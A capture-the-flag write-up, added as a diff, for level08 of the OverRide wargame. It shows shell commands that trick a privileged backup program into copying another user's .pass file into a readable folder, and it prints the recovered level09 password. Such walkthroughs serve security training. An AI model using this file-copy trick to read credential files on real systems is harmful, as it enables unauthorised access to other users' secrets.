@@ -1,0 +1,59 @@
+The program reads a file path given through the arguments, it then copies it into the ./backup folder.
+We want to pass /home/users/level09/.pass to it.
+We simply have to go to /tmp to have read and write permissions, create the folder /home/users/level09 and run the file with `~/level08 /home/users/level09/.pass`.
+
+level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
+level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+(??????????)
